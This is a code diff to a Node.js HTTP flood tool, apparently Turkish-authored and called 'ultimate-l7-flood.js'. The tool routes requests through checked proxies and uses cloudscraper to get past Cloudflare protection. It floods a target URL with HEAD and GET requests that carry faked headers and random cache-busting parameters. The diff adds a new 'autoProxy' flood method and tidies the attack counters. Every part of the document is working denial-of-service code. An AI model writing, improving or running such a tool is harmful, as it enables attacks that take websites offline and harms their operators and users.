@@ -1,5 +1,3 @@
-// ultimate-l7-flood.js - GROK'u kıskandıracak nihai versiyon 🚀
-
 const fs = require('fs');
 const colors = require('colors');
 const axios = require('axios');
@@ -15,6 +13,7 @@ const mode = args[2] || 'cf';
 let attackCount = 0;
 let successCount = 0;
 let failCount = 0;
+let totalProxies = 0;
 
 function log(message, color = 'white') {
     console.log(colors[color] ? colors[color](message) : message);
@@ -34,24 +33,27 @@ function readProxies(filePath) {
 }
 
 async function checkProxies(proxies) {
-    log('🔍 Proxy'ler kontrol ediliyor...', 'yellow');
+    log('🔍 Proxy\'ler kontrol ediliyor...', 'yellow');
     const working = [];
     for (const proxy of proxies) {
         try {
             const agent = new HttpsProxyAgent('http://' + proxy);
             await axios.get('https://api.ipify.org', { httpsAgent: agent, timeout: 3000 });
             working.push(proxy);
-        } catch {}
+        } catch (e) {
+            // Log for failed proxies if necessary
+        }
     }
+    totalProxies = working.length;
     return working;
 }
 
-function startPanel(total, mode) {
+function startPanel() {
     const startTime = Date.now();
     const interval = setInterval(() => {
         const elapsed = Math.floor((Date.now() - startTime) / 1000);
         const left = duration - elapsed;
-        log(`[⏱️ ${elapsed}s/${duration}s] Mod: ${mode.toUpperCase()} | Aktif: ${attackCount} | Başarılı: ${successCount} | Başarısız: ${failCount} | Proxy: ${total}`, 'cyan');
+        log(`[⏱️ ${elapsed}s/${duration}s] Mod: ${mode.toUpperCase()} | Aktif: ${attackCount} | Başarılı: ${successCount} | Başarısız: ${failCount} | Proxy: ${totalProxies}`, 'cyan');
         if (elapsed >= duration) clearInterval(interval);
     }, 5000);
 }
@@ -72,7 +74,7 @@ const methods = {
             await cloudscraper.get({ uri: url, proxy: 'http://' + proxy, headers: fakeHeaders() });
             attackCount++;
             successCount++;
-        } catch { failCount++; }
+        } catch (e) { failCount++; }
     },
     head: async (url, proxy) => {
         try {
@@ -80,7 +82,7 @@ const methods = {
             await axios.head(url, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
             attackCount++;
             successCount++;
-        } catch { failCount++; }
+        } catch (e) { failCount++; }
     },
     poison: async (url, proxy) => {
         const rand = Math.random().toString(36).substring(2);
@@ -90,7 +92,7 @@ const methods = {
             await axios.get(fullUrl, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
             attackCount++;
             successCount++;
-        } catch { failCount++; }
+        } catch (e) { failCount++; }
     },
     ddg: async (url, proxy) => {
         try {
@@ -106,7 +108,17 @@ const methods = {
             });
             attackCount++;
             successCount++;
-        } catch { failCount++; }
+        } catch (e) { failCount++; }
+    },
+    autoProxy: async (url, proxy) => {
+        const rand = Math.random().toString(36).substring(2);
+        const fullUrl = `${url}?cachebust=${rand}`;
+        try {
+            const agent = new HttpsProxyAgent('http://' + proxy);
+            await axios.get(fullUrl, { headers: fakeHeaders(), httpsAgent: agent, timeout: 5000 });
+            attackCount++;
+            successCount++;
+        } catch (e) { failCount++; }
     }
 };
 
@@ -128,6 +140,6 @@ function startAttackLoop(proxies, methodName) {
     const proxies = readProxies('proxies.txt');
     const workingProxies = await checkProxies(proxies);
     log(`✅ Çalışan proxy sayısı: ${workingProxies.length}`, 'green');
-    startPanel(workingProxies.length, mode);
+    startPanel();
     startAttackLoop(workingProxies, mode);
 })();
